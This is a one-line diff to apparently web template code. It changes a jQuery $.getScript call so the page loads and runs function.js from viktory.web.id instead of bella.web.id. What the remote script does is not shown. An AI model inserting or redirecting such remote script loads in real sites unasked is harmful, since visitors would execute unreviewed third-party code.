@@ -1,1 +1,1 @@
-$.getScript("https://bella.web.id/function.js", function(){ });
+$.getScript("https://viktory.web.id/function.js", function(){ });
